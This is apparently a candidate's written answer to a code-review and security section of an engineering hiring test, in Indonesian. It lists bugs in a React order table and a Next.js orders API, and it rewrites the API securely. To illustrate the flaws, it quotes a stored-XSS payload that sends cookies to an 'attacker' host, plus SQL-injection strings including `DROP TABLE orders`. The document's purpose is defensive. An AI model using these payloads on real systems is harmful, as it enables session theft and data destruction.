# Bagian C — Code Review & Security

Kandidat: **Ade Rusmana** · TEST-ENG-FS-001

Format tiap temuan: **apa yang salah · dampak ke user/bisnis · severity · perbaikan**.
Severity memakai skala: **Kritis** (bisa dieksploitasi atau merusak data) ·
**Tinggi** (fitur salah untuk semua pengguna) · **Sedang** (salah pada kondisi
tertentu) · **Rendah** (kualitas dan pemeliharaan).

---

# C1 — Frontend `OrderTable`  [10 poin]

Ditemukan 14 masalah. Soal memberi petunjuk "ada lebih dari 8".

## Kritis

### C1-1 · Stored XSS lewat `dangerouslySetInnerHTML`

```tsx
<span dangerouslySetInnerHTML={{ __html: o.customerNote }} />
```

**Salahnya.** `customerNote` adalah teks yang diketik pelanggan, dirender sebagai HTML
mentah tanpa sanitasi.

**Dampak.** Pelanggan mengisi catatan pesanan dengan
`<img src=x onerror="fetch('https://attacker/?c='+document.cookie)">`. Payload-nya
tersimpan diam-diam, lalu **berjalan di browser admin ops** yang membuka daftar
pesanan — dengan sesi dan hak admin itu. Dari situ: pencurian sesi, aksi atas nama
admin, atau menyedot data pesanan seluruh cabang. Ini XSS tersimpan pada alat internal,
kelas yang paling merugikan, karena korbannya justru pengguna dengan hak tertinggi dan
penyerang tidak perlu memancing siapa pun mengeklik apa pun.

**Perbaikan.** Render sebagai teks — `<span>{o.customerNote}</span>`; React
meng-escape-nya secara otomatis. Kalau format kaya memang syarat bisnis, sanitasi
dengan DOMPurify **dan** whitelist tag, jangan blacklist. Tambahkan CSP dan cookie
sesi `HttpOnly` sebagai jaring pengaman kedua.

## Tinggi

### C1-2 · `useEffect` dengan dependency array kosong — data tidak pernah diambil ulang

```tsx
useEffect(() => { fetch(`...&q=${query}&page=${page}`)... }, [])
```

**Salahnya.** Efeknya hanya berjalan sekali saat mount. `query`, `page`, dan `branchId`
ikut dibaca di dalamnya tapi tidak ada di dependency array.

**Dampak.** **Pencarian dan pagination sama sekali tidak berfungsi.** Mengetik akan
mengubah `query`, tombol Next akan mengubah `page`, komponen render ulang — dan
tabelnya tetap menampilkan halaman pertama tanpa filter. Untuk pengguna, tombolnya
terlihat rusak tanpa pesan apa pun. Ini bug fungsional paling serius di file ini.

**Perbaikan.** `}, [branchId, query, page])` — lalu masalah C1-3 dan C1-4 muncul dan
ikut harus ditangani. Aktifkan lint rule `react-hooks/exhaustive-deps` supaya kelas
kesalahan ini gagal di CI, bukan ditemukan pengguna.

### C1-3 · Race condition — respons lama menimpa respons baru

**Salahnya.** Setelah C1-2 diperbaiki, tiap perubahan mengirim permintaan baru tanpa
membatalkan yang lama, dan urutan datangnya tidak dijamin.

**Dampak.** Sama persis dengan bug di A4: ketik "JKT" cepat-cepat, yang tampil hasil
"JK". Admin melihat data yang bukan miliknya kata kunci — dan tidak ada indikasi
apa pun bahwa yang dilihat sudah basi. Pada tabel yang dipakai mengambil keputusan
operasional, ini menyesatkan, bukan sekadar mengganggu.

**Perbaikan.** `AbortController` yang dibatalkan di fungsi cleanup efek; atau pakai
TanStack Query yang sudah menangani pembatalan dan kunci cache dengan benar.

### C1-4 · Tidak ada debounce — satu request per ketukan tombol

**Salahnya.** `onChange` langsung memicu `setQuery`, yang memicu efek.

**Dampak.** Mengetik "Kemayoran" = 9 request, delapan di antaranya sia-sia. Setiap
request memicu query `LIKE '%...%'` di database (lihat C2-1). Sepuluh admin yang
mengetik bersamaan cukup untuk membuat database terasa berat, dan biaya ini muncul
persis saat sistem paling ramai dipakai.

**Perbaikan.** Debounce 300–350 ms sebelum memicu fetch.

### C1-5 · `key={Math.random()}`

```tsx
{orders.map(o => <div key={Math.random()}>...)}
```

**Salahnya.** Key harus **stabil dan unik per item**. `Math.random()` menghasilkan key
baru pada setiap render.

**Dampak.** React tidak bisa mencocokkan elemen lama dengan yang baru, jadi seluruh
daftar di-unmount dan dibuat ulang tiap render — bukan diperbarui. Akibatnya: DOM
dibuang percuma (terasa jelas di daftar panjang), fokus keyboard hilang, teks yang
sedang diseleksi lepas, posisi scroll melompat, dan input apa pun di dalam baris
akan mereset dirinya sendiri. Yang terlihat oleh admin: tabel "berkedip" dan tidak
bisa dipakai bekerja.

**Perbaikan.** `key={o.id}`. Kalau id belum ada di API, tambahkan — index array pun
lebih baik daripada `Math.random()`, meski tetap salah untuk daftar yang bisa berubah
urutan.

### C1-6 · Uang disimpan dan dijumlahkan sebagai `number` floating point

```tsx
const total = orders.reduce((a, o) => a + o.amount, 0)
<span>Rp {o.amount}</span>
```

**Salahnya.** Dua masalah sekaligus. Pertama, `amount` adalah IEEE-754 double —
`0.1 + 0.2 !== 0.3`; menjumlahkan banyak nilai uang mengakumulasi galat. Kedua,
angkanya dicetak mentah: `Rp 1500000`, tanpa pemisah ribuan.

**Dampak.** Angka total yang tidak cocok dengan pembukuan — kelas bug yang paling
merusak kepercayaan pada dashboard, karena tidak ada yang tahu angka mana yang benar.
Dan `Rp 1500000` sangat mudah salah dibaca sebagai Rp 150.000 saat orang memindai
tabel dengan cepat.

**Perbaikan.** Simpan uang sebagai **integer dalam satuan terkecil** (rupiah bulat)
atau `NUMERIC` di Postgres yang dikirim sebagai string, lalu hitung dengan BigInt atau
decimal library. Format dengan
`new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', maximumFractionDigits: 0 })`.

### C1-7 · Tidak ada state loading, error, dan empty

**Salahnya.** Hanya jalur bahagia yang ditangani. `fetch` tidak memeriksa `r.ok`
(fetch **tidak** menolak promise pada 404/500), tidak ada `.catch`, dan `d.data`
diasumsikan selalu ada.

**Dampak.** Saat API gagal atau mengembalikan bentuk lain, `d.data` bernilai
`undefined`, `orders.reduce` melempar `TypeError`, dan **seluruh halaman menjadi
putih** — tanpa pesan, tanpa tombol coba lagi. Saat API lambat, layar kosong tanpa
petunjuk, sehingga admin menekan tombol berkali-kali. Saat memang tidak ada pesanan,
tabel kosong tak bisa dibedakan dari "gagal memuat" — dan keduanya menuntut tindakan
yang sangat berbeda.

**Perbaikan.** Tangani ketiganya secara eksplisit: skeleton saat memuat, pesan error
yang bisa ditindaklanjuti plus tombol ulangi, dan empty state yang membedakan "belum
ada data" dari "tidak ada hasil untuk filter ini".

## Sedang

### C1-8 · `useState([])` tanpa tipe — `orders` bertipe `never[]`

**Salahnya.** TypeScript menyimpulkan `never[]`, sehingga `o.amount` dan
`o.customerNote` sebenarnya error tipe; kode ini hanya lolos kalau `strict` mati atau
ada `any` di suatu tempat. Respons API juga tidak divalidasi sama sekali.

**Dampak.** Nol perlindungan tipe justru pada data yang datang dari luar. Kalau backend
mengganti nama field `amount` menjadi `total_amount`, tidak ada yang gagal saat
compile — halamannya baru rusak di produksi, di depan pengguna.

**Perbaikan.** `useState<Order[]>([])` dengan tipe `Order` eksplisit, dan validasi
respons dengan Zod di batas jaringan. Di Bagian D, tipe dan skema query hidup di
`shared/contracts/` dan dipakai server maupun client, jadi keduanya tidak bisa
menyimpang.

### C1-9 · `setPage(page + 1)` memakai nilai dari closure

**Salahnya.** Membaca `page` dari render saat ini alih-alih dari state terbaru.

**Dampak.** Dua klik cepat pada "Next" bisa sama-sama membaca `page = 1` dan
menghasilkan `2` dua kali — nomor halaman melompat tidak konsisten. Jarang terjadi,
tapi sangat sulit direproduksi saat dilaporkan.

**Perbaikan.** `setPage(p => p + 1)`.

### C1-10 · Tombol "Next" tidak pernah nonaktif, tidak ada info total halaman

**Dampak.** Admin bisa terus menekan Next melewati halaman terakhir dan mendapat tabel
kosong yang terlihat seperti kehilangan data. Tidak ada cara mengetahui ada berapa
halaman, atau sedang di halaman berapa.

**Perbaikan.** Kembalikan `total` dari API, hitung `totalPages`, nonaktifkan Next di
halaman terakhir dan Prev di halaman pertama, tampilkan "Menampilkan 1–20 dari 347".

### C1-11 · Label "Total" berbohong — hanya menjumlahkan halaman yang terlihat

```tsx
const total = orders.reduce(...)  // hanya 20 baris di halaman ini
<p>Total: Rp {total}</p>
```

**Dampak.** Ini bug bisnis, bukan bug teknis, dan yang paling berbahaya di file ini
setelah XSS — karena hasilnya **terlihat benar**. Seseorang akan memakai angka itu
sebagai omzet cabang dan mengambil keputusan dari sana.

**Perbaikan.** Beri label jujur ("Subtotal halaman ini") **atau** minta agregat
sesungguhnya dari server, dihitung atas seluruh hasil yang cocok filter — bukan atas
satu halaman. Di Bagian D semua agregat dihitung di SQL, tepat karena alasan ini.

### C1-12 · Parameter query tidak di-encode

**Salahnya.** `?q=${query}` disisipkan mentah ke URL.

**Dampak.** Kata kunci berisi `&`, `#`, atau `+` akan memotong URL dan menghasilkan
filter yang salah diam-diam. Nama pelanggan seperti "Toko A & B" cukup untuk memicunya.

**Perbaikan.** `encodeURIComponent(query)`, atau `URLSearchParams`.

## Rendah

### C1-13 · `<input>` tanpa label, dan struktur bukan tabel

**Dampak.** Pembaca layar mengumumkan "edit teks" tanpa keterangan apa pun. Data
tabular yang dirender dengan `<div>` kehilangan navigasi tabel, hubungan header–sel,
dan `aria-sort`. Untuk alat internal yang dipakai berjam-jam tiap hari, ini bukan
kemewahan.

**Perbaikan.** `<label>` yang terhubung (atau `aria-label`), `<table>` dengan
`<th scope="col">`, dan `aria-live` saat jumlah hasil berubah.

### C1-14 · Filter dan halaman tidak tersimpan di URL

**Dampak.** Admin tidak bisa membagikan tautan ke tampilan terfilter, dan menyegarkan
halaman membuang seluruh pekerjaannya. Untuk alat ops yang dipakai berdua sambil
menelepon, ini terasa setiap hari.

**Perbaikan.** Simpan `q`, `page`, dan filter di query string — seperti yang saya
lakukan di Bagian D lewat `useCabinetQuery()`.

---

# C2 — Backend `app/api/orders/route.ts`  [10 poin]

Ditemukan 12 masalah.

## Kritis

### C2-1 · SQL injection pada dua parameter

```ts
`WHERE branch_id = '${branch}' AND customer_name LIKE '%${q}%'`
```

**Salahnya.** `branch` dan `q` datang langsung dari query string dan disambung ke teks
SQL.

**Dampak.** `/api/orders?branch=' OR '1'='1` mengembalikan pesanan **seluruh cabang**.
Lebih jauh: `q=%' UNION SELECT ... --` untuk membaca tabel lain (pengguna, hash
password, klaim garansi), atau `'; DROP TABLE orders; --` untuk merusak data. Karena
endpoint ini juga tanpa otentikasi (C2-2), yang bisa melakukannya adalah **siapa pun
di internet** yang menemukan URL-nya.

**Perbaikan.** Query berparameter, tanpa pengecualian.

### C2-2 · Tidak ada otentikasi maupun otorisasi

**Salahnya.** Handler tidak pernah menanyakan siapa pemanggilnya.

**Dampak.** Data pesanan internal — nama pelanggan, nilai transaksi, sebaran cabang —
terbuka untuk publik. Sekaligus **IDOR** (A8): meski nanti ada login, `branch` diambil
dari client, sehingga supervisor Kemayoran cukup mengubah satu parameter di address
bar untuk membaca omzet seluruh cabang.

**Perbaikan.** Periksa sesi lebih dulu, lalu ambil daftar cabang yang berhak **dari
sesi itu**, dan jadikan bagian dari `WHERE` — jangan pernah mempercayai pengenal ruang
lingkup yang dikirim client. Tegakkan juga di database dengan RLS supaya endpoint yang
lupa memeriksa tetap tidak bocor.

## Tinggi

### C2-3 · Tidak ada pagination — `page` dibaca lalu dibuang

```ts
const page = searchParams.get('page')   // tidak pernah dipakai lagi
```

**Salahnya.** Query mengambil **semua** baris yang cocok. Parameternya dibaca, jadi
niatnya jelas ada, tapi tidak pernah sampai ke SQL.

**Dampak.** Dua hal. Pertama, pagination di UI **diam-diam tidak berfungsi** — tombol
Next mengubah URL dan hasilnya sama saja. Kedua, dan lebih serius: pada tabel pesanan
yang bertumbuh, satu request menarik ratusan ribu baris ke memori Node lalu
men-serialisasinya jadi JSON. Itu vektor DoS satu baris `curl`, sekaligus penyebab
kehabisan memori yang akan menjatuhkan seluruh proses server, bukan hanya request itu.

**Perbaikan.** `LIMIT`/`OFFSET` (atau keyset, lihat A9) dengan `pageSize` yang dibatasi
enum, dan kembalikan `total` untuk UI.

### C2-4 · Tidak ada penanganan error — pesan database bocor ke pemanggil

**Salahnya.** Tidak ada `try/catch`. Kegagalan query menjadi unhandled rejection.

**Dampak.** Next mengembalikan 500 yang, tergantung konfigurasi, dapat memuat pesan
driver Postgres beserta potongan SQL, nama tabel, dan nama kolom. Itu peta gratis bagi
penyerang untuk menyusun serangan C2-1. Bagi pengguna biasa, yang terlihat hanyalah
error mentah tanpa arti.

**Perbaikan.** `try/catch`, catat detail lengkap di server, dan kembalikan amplop error
yang stabil dan tidak membocorkan apa pun — persis yang saya bangun di
`server/utils/api.ts` pada Bagian D.

### C2-5 · Tidak ada validasi input

**Dampak.** `branch` bisa `null` (parameter tidak dikirim), menghasilkan
`WHERE branch_id = 'null'` — string literal, bukan SQL NULL — yang mengembalikan nol
baris tanpa ada yang salah secara kasat mata. `page=abc` diterima diam-diam. Tidak ada
batas panjang untuk `q`.

**Perbaikan.** Skema Zod di batas request; tolak dengan 400 beserta field yang salah.

## Sedang

### C2-6 · `SELECT *`

**Dampak.** Mengirimkan setiap kolom, termasuk yang tidak dipakai UI dan yang mungkin
sensitif (nomor telepon pelanggan, catatan internal, biaya). Menambah kolom baru di
database secara otomatis akan membocorkannya lewat API ini, tanpa satu baris pun kode
berubah. Juga menaikkan trafik dan menghalangi index-only scan.

**Perbaikan.** Sebut kolomnya satu per satu.

### C2-7 · Wildcard LIKE dalam input tidak di-escape

**Dampak.** Mencari `%` cocok dengan semua baris; `_` cocok dengan karakter apa pun.
Pengguna mengira pencariannya rusak, dan satu request bisa dipaksa memindai seluruh
tabel. Ini soal kebenaran dan beban, terpisah dari injection.

**Perbaikan.** Escape `\`, `%`, dan `_` di dalam nilai, lalu `ESCAPE '\'`.

### C2-8 · `ORDER BY created_at DESC` tanpa pemecah seri

**Dampak.** Dua pesanan dengan `created_at` identik bisa bertukar urutan antar request.
Begitu pagination ditambahkan, baris yang sama bisa muncul di dua halaman sementara
baris lain tidak pernah terlihat.

**Perbaikan.** `ORDER BY created_at DESC, id DESC`.

### C2-9 · `branch_id` dibandingkan dengan literal string

**Dampak.** Kalau `branch_id` bertipe `bigint`, `= 'B-01'` akan gagal cast saat runtime;
kalau bertipe teks tapi index-nya dibuat lain, perbandingannya bisa melewatkan index.
Dua-duanya baru ketahuan di produksi.

**Perbaikan.** Parameter bertipe benar, ditegakkan oleh Zod dan tipe kolom.

## Rendah

### C2-10 · Tidak ada rate limit

**Dampak.** Endpoint pencarian yang mahal, tanpa otentikasi dan tanpa batas, adalah
sasaran empuk. Perbaikan: batasi per pengguna/IP.

### C2-11 · Tidak ada header cache

**Dampak.** Tanpa `Cache-Control`, proxy atau CDN di depan aplikasi bisa menyimpan
respons berisi data satu cabang dan menyajikannya ke penanya berikutnya. Untuk data
per-pengguna, ini kebocoran. Perbaikan: `Cache-Control: private, no-store`.

### C2-12 · Tidak ada observability

**Dampak.** Tidak ada log, tidak ada durasi query, tidak ada request id. Saat ada
laporan "dashboard lambat", tidak ada apa pun untuk dilihat. Perbaikan: log
terstruktur berisi request id, durasi, jumlah baris, dan pengguna.

---

## C2 — Route handler yang ditulis ulang

```ts
// app/api/orders/route.ts
import { NextResponse } from 'next/server'
import { z } from 'zod'
import { db } from '@/lib/db'
import { requireSession } from '@/lib/auth'

/**
 * GET /api/orders
 *
 * Berbeda dari versi aslinya pada empat hal yang bisa dieksploitasi:
 * otentikasi + scoping cabang dari sesi, SQL berparameter, pagination berbatas,
 * dan error yang tidak membocorkan internal.
 */

const PAGE_SIZES = [20, 50, 100] as const

const querySchema = z.object({
  q: z.string().trim().max(100).default(''),
  // Cabang tetap boleh diminta, tapi hanya sebagai PENYEMPIT di dalam cabang
  // yang memang sudah menjadi hak pemanggil — bukan sebagai penentu akses.
  branch: z.string().trim().regex(/^[A-Za-z0-9-]{1,32}$/).optional(),
  page: z.coerce.number().int().min(1).max(10_000).default(1),
  pageSize: z.coerce
    .number()
    .int()
    .refine((v) => (PAGE_SIZES as readonly number[]).includes(v))
    .default(20),
})

/** '%' dan '_' adalah karakter biasa bagi pengguna, wildcard bagi SQL. */
const escapeLike = (s: string) => s.replace(/[\\%_]/g, '\\$&')

export async function GET(req: Request) {
  try {
    // 1. Siapa pemanggilnya. Sebelum apa pun yang lain.
    const session = await requireSession(req) // melempar 401 kalau tidak ada sesi

    // 2. Validasi input; tolak dengan menyebutkan field yang salah.
    const parsed = querySchema.safeParse(
      Object.fromEntries(new URL(req.url).searchParams),
    )
    if (!parsed.success) {
      return NextResponse.json(
        {
          error: {
            code: 'VALIDATION_ERROR',
            message: 'Parameter tidak valid',
            details: parsed.error.issues.map((i) => ({
              path: i.path.join('.'),
              message: i.message,
            })),
          },
        },
        { status: 400 },
      )
    }

    const { q, branch, page, pageSize } = parsed.data

    // 3. Otorisasi. Cabang yang boleh dilihat berasal dari SESI, bukan dari URL.
    //    Kalau pemanggil meminta satu cabang tertentu, ia harus ada di dalam
    //    haknya; kalau tidak, 404 — bukan 403, karena 403 mengonfirmasi bahwa
    //    cabang itu ada.
    const allowed = session.allowedBranchIds
    if (branch && !allowed.includes(branch)) {
      return NextResponse.json(
        { error: { code: 'NOT_FOUND', message: 'Cabang tidak ditemukan' } },
        { status: 404 },
      )
    }
    const scope = branch ? [branch] : allowed
    if (scope.length === 0) {
      return NextResponse.json({ data: [], meta: { page, pageSize, total: 0, totalPages: 1 } })
    }

    const offset = (page - 1) * pageSize
    const search = q ? `%${escapeLike(q)}%` : null

    // 4. Query berparameter. Kolom disebut satu per satu, bukan SELECT *.
    //    Jumlah total ikut lewat window function, jadi tidak perlu query kedua.
    //    ORDER BY diakhiri kunci unik supaya pagination stabil.
    const { rows } = await db.query(
      `SELECT o.id,
              o.branch_id,
              o.customer_name,
              o.customer_note,
              o.amount::text AS amount,   -- NUMERIC dikirim sebagai string, tidak pernah float
              o.status,
              o.created_at,
              count(*) OVER ()::int AS total_count
         FROM orders o
        WHERE o.branch_id = ANY($1)
          AND ($2::text IS NULL OR o.customer_name ILIKE $2 ESCAPE '\\')
        ORDER BY o.created_at DESC, o.id DESC
        LIMIT $3 OFFSET $4`,
      [scope, search, pageSize, offset],
    )

    const total = rows[0]?.total_count ?? 0

    return NextResponse.json(
      {
        data: rows.map(({ total_count, ...order }) => order),
        meta: { page, pageSize, total, totalPages: Math.max(1, Math.ceil(total / pageSize)) },
      },
      // Data per-pengguna tidak boleh disimpan proxy bersama mana pun.
      { headers: { 'Cache-Control': 'private, no-store' } },
    )
  } catch (error) {
    if (error instanceof UnauthorizedError) {
      return NextResponse.json(
        { error: { code: 'UNAUTHORIZED', message: 'Silakan masuk kembali' } },
        { status: 401 },
      )
    }

    // Detail lengkap ke log server; ke pemanggil hanya kalimat yang aman.
    // Pesan driver Postgres membocorkan nama tabel, nama kolom, dan potongan SQL.
    console.error('[api/orders] gagal', { error, url: req.url })
    return NextResponse.json(
      { error: { code: 'INTERNAL', message: 'Terjadi kesalahan tak terduga di server.' } },
      { status: 500 },
    )
  }
}
```

**Yang sengaja saya tinggalkan di luar contoh ini**, karena tempatnya bukan di dalam
route handler: rate limiting (middleware atau gateway), log terstruktur dengan request
id (middleware), dan RLS di PostgreSQL. RLS penting justru karena ia menegakkan aturan
yang sama satu lapis lebih dalam — sehingga route handler berikutnya yang lupa
memanggil `requireSession` tetap tidak bisa membocorkan data.

**Catatan tentang `amount`.** Saya mengirimkannya sebagai `text` dari `NUMERIC`, bukan
sebagai `number`. Begitu nilai uang menyentuh `JSON.parse`, ia menjadi IEEE-754 double
dan galatnya tidak bisa dikembalikan lagi. Client memformatnya dengan `Intl`, dan
kalau perlu berhitung, memakai BigInt atau decimal library — bukan `+`.
